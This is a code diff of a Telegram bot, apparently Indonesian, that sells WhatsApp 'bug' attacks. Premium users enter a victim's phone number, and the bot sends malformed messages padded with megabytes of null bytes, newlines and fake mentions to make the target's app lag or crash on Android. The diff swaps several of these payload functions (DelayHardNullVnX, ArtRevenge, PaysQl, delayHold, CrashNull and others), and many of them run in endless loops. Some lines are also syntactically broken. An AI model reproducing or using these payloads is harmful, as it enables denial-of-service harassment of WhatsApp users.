@@ -1038,10 +1038,10 @@ function mainKeyboard() {
   return [
     [
       { text: "⚙️𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒", callback_data: "xsettings", style: "success" },
-      { text: "🚀𝐗𝐁𝐔𝐆𝐒", callback_data: "xbugs", style: "danger" }
+      { text: "🚀𝐗𝐌𝐄𝐍𝐔𝐁𝐔𝐆𝐒", callback_data: "xbugs", style: "danger" }
     ],
     [
-      { text: "🎲𝐓𝐎𝐎𝐋𝐒", callback_data: "tools", style: "primary" }
+      { text: "💎𝐓𝐎𝐎𝐋𝐒", callback_data: "tools", style: "primary" }
     ],
     [
       { text: "🌿𝐂𝐇𝐀𝐍𝐄𝐋", url: "https://t.me/AboutMybawz", style: "success" },
@@ -1146,41 +1146,95 @@ bot.action("xsettings", async (ctx) => {
 
 bot.action("xbugs", async (ctx) => {
   await ctx.answerCbQuery();
+  await showInfo(ctx, 1);
+});
 
-  const premium = isPremium(ctx.from.id);
-  const sender = isWhatsAppConnected;
+async function showxbugs(ctx, page = 1) {
 
-  const caption = `
+  const premium = isPremium(ctx.from.id); 
+  const sender = isWhatsAppConnected;     
+
+  let caption = "";
+  let keyboard = [];
+
+  if (page === 1) {
+    caption = `
 <pre>╭═───⊱『 🐉𝐆𝐗𝐈𝐎𝐍 』───═⬡
 ◇ Developer : @Bawzhhh
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 🚀𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡        
-◇ /specterdelay - Delay No Kenon
-◇ /delayworek - Delay Hard Worth ( Maybe )
-◇ /EquarTerdelay - One Shoot Delay 
-◇ /qiSys - Delay Hard Can Spam No Kenon
-◇ /dangerdelay - Delay Hard Invisible 100%
-
-╭═───⊱『 ✨𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
-◇ /androidcrash - Crash Android 
-◇ /testfunction - Test Your Function
+╭═───⊱『 🚀𝐁𝐄𝐁𝐀𝐒 𝐒𝐏𝐀𝐌 𝐌𝐄𝐍𝐔 』───═⬡        
+◇ /specterdelay 62xxx - Delay No Kenon
+◇ /delayworek 62xxx - Delay Hard Worth ( Maybe )
+◇ /EquarTerdelay 62xxx - One Shoot Delay 
+◇ /qiSys 62xxx - Delay Hard Can Spam No Kenon
+◇ /dangerdelay 62xxx - Delay Hard Invisible 100%
 </pre>
 `;
 
-  await editMenu(ctx, caption, [[{ text: "🔙𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "backmenu", style: "primary" }]]);
+    keyboard = [
+      [
+        { text: "⬅️", callback_data: "info_2", style: "primary" },
+        { text: "➡️", callback_data: "info_2", style: "danger" }
+      ],
+      [
+        { text: "🔙𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "backmenu", style: "success" }
+      ]
+    ];
+  }
+  
+    if (page === 2) {
+    caption = `
+  <pre>╭═───⊱『 🐉𝐆𝐗𝐈𝐎𝐍 』───═⬡
+◇ Developer : @Bawzhhh
+◇ Version : 1.0 New Era
+◇ Language : JavaScript
+◇ Framework : Telegraf 
+
+  ╭═───⊱『 ✨𝐍𝐎 𝐒𝐏𝐀𝐌 𝐌𝐄𝐍𝐔 』───═⬡        
+◇ /androcrash 62xxxx - Crash Android 
+</pre>
+`;
+
+keyboard = [
+      [
+        { text: "⬅️", callback_data: "info_1", style: "primary" },
+        { text: "➡️", callback_data: "info_1", style: "danger" }
+      ],
+      [
+        { text: "🔙𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "backmenu", style: "success" }
+      ]
+    ];
+  }
+
+  await editMenu(ctx, caption, keyboard);
+}
+
+bot.action("info_1", async (ctx) => {
+  await ctx.answerCbQuery();
+  await showxbugs(ctx, 1);
 });
 
-bot.action("tools", async (ctx) => {
+bot.action("info_2", async (ctx) => {
+  await ctx.answerCbQuery();
+  await showxbugs(ctx, 2);
+});
+
+bot.action("backmenu", async (ctx) => {
+  await ctx.answerCbQuery();
+  await sendHome(ctx);
+});
+
+  bot.action("tools", async (ctx) => {
   await ctx.answerCbQuery();
 
-  const premium = isPremium(ctx.from.id); 
-  const sender = isWhatsAppConnected;   
+  const premium = isPremium(ctx.from.id);
+  const sender = isWhatsAppConnected;
 
   const caption = `
-<pre>╭═───⊱『 🐉𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
+  <pre>╭═───⊱『 🐉𝐆𝐗𝐈𝐎𝐍 』───═⬡
 ◇ Developer : @Bawzhhh
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
@@ -1243,7 +1297,7 @@ async function showInfo(ctx, page = 1) {
 
   if (page === 2) {
     caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
+<pre>╭═───⊱『 🐉𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
 ◇ Developer : @Bawzhhh
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
@@ -2112,17 +2166,8 @@ bot.command("specterdelay", checkAllPremium, checkWhatsAppConnection, async (ctx
 
   (async () => {
     for (let r = 0; r < 30; r++) {
-  await ZenBuldoInvis(sock, target);
-  await sleep(500);
-
-  await SuperDelay(sock, target);
-  await sleep(1000);
-  
-  await VnXDelayAiInvis(sock, target);
-  await sleep(1000);
-  
-  await ArtGuarfian(sock, target);
-  await sleep(1000);
+  await DelayHardNullVnX(sock, target);
+  await sleep(100);
 }
   })();
 
@@ -2138,9 +2183,8 @@ bot.command("delayworek", checkAllPremium, checkWhatsAppConnection, async (ctx) 
   await ctx.reply(`✅ delayworek (bug) selesai untuk ${q}`);
 
   (async () => {
-    for (let r = 0; r < 150; r++) {
-  await ArtForever(sock, target);
-  await sleep(1000);
+    for (let r = 0; r < 1; r++) {
+  await ArtRevenge(sock, target);
 }
   })();
 
@@ -2174,9 +2218,15 @@ bot.command("dangerdelay", checkAllPremium, checkWhatsAppConnection, async (ctx)
   await ctx.reply(`✅ dangerdelay (bug) terkirim dan selesai untuk ${q}`);
 
   (async () => {
-    for (let r = 0; r < 50; z++) {
-  await ArtGold(sock, target);
+    for (let r = 0; r < 20; z++) {
+  await ArtGold(sock, target, true);
   await sleep(1000);
+  
+  await VnXDelayAiInvis(sock, target)
+  await sleep(1000);
+  
+  await PaysQl(sock, target)
+  await sleep(5000);
 }
   })();
 
@@ -2205,284 +2255,107 @@ bot.command("qiSys", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   });
 
   (async () => {
-    for (let i = 0; i < 60; i++) {
+    for (let i = 0; i < 40; i++) {
       console.log(chalk.red(`Send Bug Delay Hard Spam ${i + 1}/30 To ${q}`));
-      await DelayedStatusHard(sock, target);
+      await DelayedStatusHard(sock, target, true);
       await sleep(1000);
       
       await SuperDelay(sock, target);
       await sleep (1000);
+      
+      await delayHold(sock, target);
+      await sleep(10000)
     }
   })();
 });
-/// CASE BUG 10///
-bot.command("androidcrash", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
-  try {
-    const q = ctx.message?.text?.split(" ")[1];
-    if (!q) return ctx.reply("🪧 ☇ Example : /androidcrash 62xx");
-
-    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-
-    await ctx.reply(
-`<pre>
-⬡═―━⊱ [ GXION ] ⊰━—═⬡
-⌑ Target : ${q}
-⌑ Type   : CRASH ANDROID
-⌑ Status : Successful
-╘═—━━━━━━━━━━━—═⬡</pre>`,
-      {
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
-          ]
-        }
-      }
-    );
-
-    for (let i = 0; i < 100; i++) {
-      await CrashNull(sock, target);
-      await sleep(500);
-      console.log(`🦋 Success Sending Bugs To : ${target}`);
-    }
-
-  } catch (err) {
-    console.log("ERROR:", err.message);
-    ctx.reply("❌ Terjadi error");
-  }
-});
  
 // ------------ (  FUNCTION BUGS ) -------------- \\
-async function ZenBuldoInvis(sock, target) {
-    console.log(`⏰️ ZenBuldoInvis: ${target}`);
-    while (true) {
-        try {
-            const msg1 = {
-                viewOnceMessage: {
-                    message: {
-                        interactiveResponseMessage: {
-                            body: {
-                                text: "Kayzen Is Here"
-                            },
-                            nativeFlowResponseMessage: {
-                                name: "galaxy_message",
-                                paramsJson: JSON.stringify({
-                                    flow_cta: "\n".repeat(900000)
-                                }),
-                                version: 3
-                            },
-                            nativeFlowResponseMessageV2: {
-                                name: "contact_message",
-                                paramsJson: `BEGIN:VCARD\nVERSION:3.0\nFN:${"\u0000".repeat(500000)}\nX-WA-BIZ-NAME:${"\u0000".repeat(500000)}\nX-WA-BIZ-DESCRIPTION:${"\u0000".repeat(500000)}\nORG:${"\u0000".repeat(950 * 1020)};\nTEL;type=CELL;type=VOICE;waid=999999999:99999999\nEND:VCARD`
-                            },
-                            contextInfo: {
-                                mentionedJid: Array.from({ length: 1000 }, (_, r) => `6285983729${r}@s.whatsapp.net`),
-                                isForwarded: true,
-                                forwardingScore: 999999,
-                                businessMessageForwardInfo: {
-                                    businessOwnerJid: target
-                                }
-                            }
-                        }
-                    }
-                }
-            };
-
-            await sock.relayMessage(target, msg1, { 
-                messageId: "ZEN-" + Math.random().toString(36).toUpperCase() 
-            });
-
-            await new Promise(resolve => setTimeout(resolve, 100)); 
-
-        } catch (e) {
-            console.error(e);
-            break; 
-        }
-    }
-
-async function SuperDelay(sock, target) {
-  const msg = {
-    message: {
-      viewOnceMessage: {
-        message: {
-          interactiveResponseMessage: {
+async function DelayHardNullVnX(sock, target, ptcp = true) {
+ 
+    let msg = await generateWAMessageFromContent(target, {
+        interactiveResponseMessage: {
             body: {
-              text: "A - r - T",
-              format: "DEFAULT"
+                text: "VnX",
+                format: "DEFAULT"
             },
             nativeFlowResponseMessage: {
-              name: "galaxy_message",
-              paramsJson: "\u0000".repeat(1045000),
-              version: 3
-            },
-           contextInfo: {
-            mentionedJid: Array.from({ length: 1990 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
-            groupMentions: Array.from({ length: 2000 }, () => ({
-            groupJid: `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`,
-            groupSubject: "Artillery - Team"
-            }))
-            },
-          }
+                name: "galaxy_message",
+                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
+                version: 3
+            }
         }
-      }
-    }
-  };
- await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, { participant: { jid: target } });
+    }, { userJid: sock.user.id });
+
+    await sock.relayMessage(target, {
+        viewOnceMessage: {
+            message: msg.message
+        }
+    }, ptcp ? { 
+        messageId: msg.key.id, 
+        participant: { jid: target } 
+    } : { 
+        messageId: msg.key.id 
+    });
 }
 
-async function VnXDelayAiInvis(sock, target) {
-    const VnXForwardAi = [
-    "13135550202@bot", "13135550202@bot",
-    "13135550202@bot", "13135550202@bot",
-    "13135550202@bot", "13135550202@bot",
-    "13135550202@bot", "13135550202@bot",
-    "13135550202@bot", "13135550202@bot"
-  ];
-
-    while (true) {
-        try {
-            const msg = await generateWAMessageFromContent(
-                target,
-                {
-                 groupStatusMessageV2: {
-                    message: {
-                      interactiveResponseMessage: {
-                        contextInfo: {
-                           mentionedJid: Array.from({ length: 200900 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
-                         },
-                          body: {
-                             text: "VnXIsHere",
-                                format: "DEFAULT"
-                                },
-                                nativeFlowResponseMessage: {
-                                   name: "galaxy_message",
-                                   paramsJson: `{\"flow_cta\":\"${"\n".repeat(999999)}\"}}`,
-                                   version: 3
-                                 }
-                           }
-                      }
-                 }
-             },
-          { userJid: sock.user.id } 
-        );
-
-            await sock.relayMessage(
-                target,
-                msg.message,
-                {
-                    messageId: msg.key.id,
-                    participant: { jid: target }
-                }
-            );
-
-            console.log(`👻 XdelayVnX ke ${target} (Looping Active)`);
-
-            await new Promise(resolve => setTimeout(resolve, 1000));
-
-        } catch (err) {
-            console.error("❌ Error dalam Loop:", err);
-            await new Promise(resolve => setTimeout(resolve, 5000));
-        }
-    }
-}
-.
-async function ArtGuarfian(sock, target, mention = true) {
-  let msg = await generateWAMessageFromContent(target, {
-    viewOnceMessage: {
+async function ArtRevenge(sock, target) {
+ while (true) {
+  await sock.relayMessage("status@broadcast", {
+    botInvokeMessage: {
       message: {
+        messageContextInfo: {
+          messageSecret: crypto.randomBytes(32),
+          deviceListMetadata: {
+            senderKeyIndex: 0,
+            senderTimestamp: Date.now(),
+            recipientKeyIndex: 0
+          },
+          deviceListMetadataVersion: 2
+        },
         interactiveResponseMessage: {
+          contextInfo: {
+            remoteJid: "status@broadcast",
+            fromMe: true,
+            forwardedAiBotMessageInfo: {
+              botJid: "13135550202@bot",
+              botName: "ArT - Businnes",
+              creator: "ArT - Revenge"
+            },
+            statusAttributionType: 2,
+            statusAttributions: Array.from({ length: 209000 }, (_, z) => ({
+              type: 1
+            })),
+            participant: sock.user.id
+          },
           body: {
-            text: "Art - Guardian",
+            text: "ArT - Revenge",
             format: "DEFAULT"
           },
-              nativeFlowResponseMessage: {
-                name: "call_permission_request",
-                paramsJson: "\u0000".repeat(145000),
-                version: 3
-              },
-                entryPointConversionSource: "galaxy_message",.
-              }
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "{ X: { status:true } }",
+            version: 3
           }
+        }
       }
- }, {
-        ephemeralExpiration: 0,
-        forwardingScore: 0,
-        isForwarded: false,
-        font: Math.floor(Math.random() * 9),
-        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
-    });
-
-    await sock.relayMessage("status@broadcast", msg.message, {
-        messageId: msg.key.id,
-        statusJidList: [target],
-        additionalNodes: [{
-            tag: "meta",
-            attrs: {},
-            content: [{
-                tag: "mentioned_users",
-                attrs: {},
-                content: [
-                    { tag: "to", attrs: { jid: target }, content: undefined }
-                ]
-            }]
-        }]
-    });
-
-    await sleep(1000);
-
-    if (msg) {
-        await sock.relayMessage(target, {
-            statusMentionMessage: {
-                message: {
-                    protocolMessage: {
-                        key: msg.key,
-                        type: 25,
-                    },
-                },
-            },
-        }, {});
     }
-}
-
-async function ArtForever(sock, target) {
-  try {
-    var jut = {
-      groupStatusMessageV2: {
-        message: {
-          interactiveResponseMessage: {
-            body: {
-              text: "Art - Forever" + "\u0000".repeat(500000) + "\u200B".repeat(200000),
-              format: "DEFAULT"
-            },
-            
-            nativeFlowResponseMessage: {
-              name: "galaxy_message" + "\u0001\u0002\u0003".repeat(100000),
-              paramsJson: "\u0000".repeat(1045000) + "\u200C\u200D".repeat(100000),
-              version: 3
-            },
-            
-         contextInfo: {
-           mentionedJid: [target],
-           forwardingScore: 9999,
-           isForwarded: true,
-           quotedMessage: {
-      extendedTextMessage: {
-        text: "\u0000\u200B\uFEFF".repeat(200000)
-       }
-     }
-         }
-       }
-     }
-   }
- };
-
-    await sock.relayMessage(target, jut, {
-      participant: { jid: target }
-    });
-    
-  } catch (error) {
-    console.log(` error: ${error.message}`);
-  }
+  }, {
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: { status_setting: "contacts" },
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{
+          tag: "to",
+          attrs: { jid: target },
+          content: []
+         }]
+       }]
+     }]
+   })
+ }
 }
 
 async function ArTDeadass(sock, target) {
@@ -2708,6 +2581,112 @@ participant: { jid: target },
   });
 }
 
+async function VnXDelayAiInvis(sock, target) {
+    const VnXForwardAi = [
+    "13135550202@bot", "13135550202@bot",
+    "13135550202@bot", "13135550202@bot",
+    "13135550202@bot", "13135550202@bot",
+    "13135550202@bot", "13135550202@bot",
+    "13135550202@bot", "13135550202@bot"
+  ];
+
+    while (true) {
+        try {
+            const msg = await generateWAMessageFromContent(
+                target,
+                {
+                 groupStatusMessageV2: {
+                    message: {
+                      interactiveResponseMessage: {
+                        contextInfo: {
+                           mentionedJid: Array.from({ length: 200900 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
+                         },
+                          body: {
+                             text: "VnXIsHere",
+                                format: "DEFAULT"
+                                },
+                                nativeFlowResponseMessage: {
+                                   name: "galaxy_message",
+                                   paramsJson: `{\"flow_cta\":\"${"\n".repeat(999999)}\"}}`,
+                                   version: 3
+                                 }
+                           }
+                      }
+                 }
+             },
+          { userJid: sock.user.id } 
+        );
+
+            await sock.relayMessage(
+                target,
+                msg.message,
+                {
+                    messageId: msg.key.id,
+                    participant: { jid: target }
+                }
+            );
+
+            console.log(`👻 XdelayVnX ke ${target} (Looping Active)`);
+
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+        } catch (err) {
+            console.error("❌ Error dalam Loop:", err);
+            await new Promise(resolve => setTimeout(resolve, 5000));
+        }
+    }
+}
+
+async function PaysQl(client, target) {
+  const msg = await generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            contextInfo: {
+              remoteJid: " X ",
+              mentionedJid: Array.from({ length: 1900 }, () =>
+                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
+              )
+            },
+            body: {
+              text: " @vinzxiterr ",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "payment_info",
+              paramsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"4UJPSC1FYKC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"¿!deadcode!¿","key":" ¿🎭? ${"\u0000".repeat(999999)}","key_type":"CPF"}}],"share_payment_status":false}`,
+              version: 3
+            }
+          }
+        }
+      }
+    },
+    {
+      participant: { jid: target }
+    }
+  )
+
+  for (let i = 0; i < 20; i++) {
+    await client.relayMessage(
+      target,
+      {
+        groupStatusMessageV2: {
+          message: msg.message
+        }
+      },
+      {
+        messageId: msg.key.id,
+        participant: { jid: target }
+      }
+    )
+
+    await sleep(1500)
+  }
+}
+
+
 async function SuperDelay(sock, target) {
   const msg = {
     message: {
@@ -2738,141 +2717,42 @@ async function SuperDelay(sock, target) {
  await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, { participant: { jid: target } });
 }
 
-async function CrashNull(sock, target) {
-  try {
-    console.log(`Sending Crash null to ${target}`);
-    
-    const RuxzsMsg = {
-      viewOnceMessage: {
-        message: {
-          newsletterAdminInviteMessage: {
-            newsletterJid: "9999999999@newsletter",
-            newsletterName: "\u0000".repeat(350000),
-            caption: "\u0000".repeat(2000000),
-            inviteCode: "\u0000".repeat(200000),
-            inviteExpiration: 9999999999999,
-            newsletterThumbnail: "\u0000".repeat(500000),
-            contextInfo: {
-              statusAttributionType: 2,
-              statusAttributions: Array.from({ length: 2009990 }, (_, z) => ({
-                type: 1
-              })),
-              quotedMessage: {
-                paymentInviteMessage: {
-                  serviceType: 999,
-                  expiryTimestamp: 9999999999999,
-                  currencyCodeIso4217: "USD",
-                  amount1000: 999999999999,
-                  status: 999,
-                  noteMessage: {
-                    extendedTextMessage: {
-                      text: "\u0000".repeat(1000000),
-                      description: "\u0000".repeat(500000),
-                      title: "\u0000".repeat(500000)
-                    }
-                  },
-                  contextInfo: {
-                    statusAttributionType: 2,
-                    statusAttributions: Array.from({ length: 1000000 }, (_, z) => ({
-                      type: 1
-                    })),
-                    mentionedJid: Array.from({ length: 3000 }, () => 
-                      Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
-                    )
-                  }
-                }
-              },
-              deviceListMetadata: {},
-              deviceListMetadataVersion: 2,
-              forwardingScore: 99999999,
-              isForwarded: true
-            }
+async function delayHold(sock, target) {
+  const msg = {
+    interactiveResponseMessage: {
+      body: { 
+        text: "ARTILLERY", 
+        format: "DEFAULT" 
+      },
+      nativeFlowResponseMessage: {
+        name: "call_permission_request",
+        paramsJson: "\x10".repeat(700000),
+        version: 3,
+      },
+      entryPointConversionSource: "{}",
+      contextInfo: {
+        quotedMessage: {
+          paymentInviteMessage: {
+            serviceType: "FPM",
+            expiryTimestamp: 1814400000
           }
-        }
+        },
+        mentionedJid: Array.from({ length: 100 }, () => "0@newsletter"),
+        groupMentions: [
+          {
+            groupJid: "0@newsletter",
+            groupSubject: "."
+          }
+        ],
+        participant: target,
+        remoteJid: target
       }
-    };
-    
-    await sock.relayMessage(target, RuxzsMsg, {
-      participant: { jid: target }
-    });
-    
-    console.log(`✅ Sukses Send Crash null to: ${target}`);
-    
-  } catch (err) {
-    console.error(`❌ Error: ${err.message}`);
-  }
-}
-
-async function VnXLockChat(sock, target) {
-    try {
-        await sock.relayMessage(
-            target,
-            {
-             viewOnceMessage: {
-               message: {
-                groupInviteMessage: {
-                        groupJid: "1@g.us",
-                        inviteCode: "ꦽ".repeat(5000),
-                        inviteExpiration: "99999999999",
-                       groupName: "༑ ▾ VnX Lock Chat ▾ ༑" + "ꦾ".repeat(250000),
-                       caption: " x " + "ꦾ".repeat(5000),
-                       body: { text: "\u200B" + "ោ៝".repeat(25000) },
-                       },
-                        contextInfo: {
-                          isForwarded: true,
-                          forwardingScore: 999,
-                        }
-                    }
-                }
-            },
-            { participant: { jid: target } }
-        );
-        
-        const vnxmbgg = generateWAMessageFromContent(target, {
-            viewOnceMessage: {
-                message: {
-                  templateButtonReplyMessage: {
-                  amount: "CORRUPT",
-                  selectedIndex: null,
-               contextInfo: {
-                stanzaId: null, 
-                participant: target,
-                 paymentInviteMessage: null,
-                quotedMessage: {
-                   contactMessage: {
-                        displayName: "vnx" + "ြ".repeat(25000),
-                         vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰‌°‌‌VnX ⿻ Are You Okay? ✶ > 666${"ြ".repeat(25000)}\nEND:VCARD`,
-                        renderLargerThumbnail: true,
-                            },
-                            contextInfo: {
-                                isForwarded: true,
-                                forwardingScore: 999,
-                            },
-                          },
-                     },
-                    },
-                },
-            },
-        }, {
-            ephemeralExpiration: 0,
-            forwardingScore: 9741,
-            isForwarded: true,
-            font: Math.floor(Math.random() * 99999999),
-            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
-        });
-
-        await sock.relayMessage(target, {
-            viewOnceMessage: {
-              message: vnxmbgg.message,
-            },
-        }, {
-            messageId: vnxmbgg.key.id,
-            participant: { jid: target },
-        });
-
-    } catch (err) {
-        console.error("error:", err);
     }
+  };
+    
+  await sock.relayMessage(target, msg, {
+    participant: { jid: target }
+  });
 }
 
 // --- Jalankan Bot --- //
